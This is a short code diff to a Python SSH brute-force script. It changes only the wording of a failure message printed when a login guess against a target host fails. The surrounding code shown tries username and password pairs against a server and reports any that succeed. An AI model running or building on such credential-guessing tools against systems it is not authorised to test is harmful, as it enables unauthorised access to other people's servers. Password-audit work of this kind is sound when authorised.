@@ -54,7 +54,7 @@ def bruteforce(target, port, pas, paslist, log, loglist):
         try:
             sshServer.connect(target, int(port), username=log, password=pas, timeout=0.5)
         except:
-            print(f"CREDS: {log}:{pas} are wrong try passlist (-P) option")
+            print(f"CREDS: {log}:{pas} are wrong try -P option")
         else:
             print(f'succesfuly conected with creds(log:pas) {log}:{pas}')
 
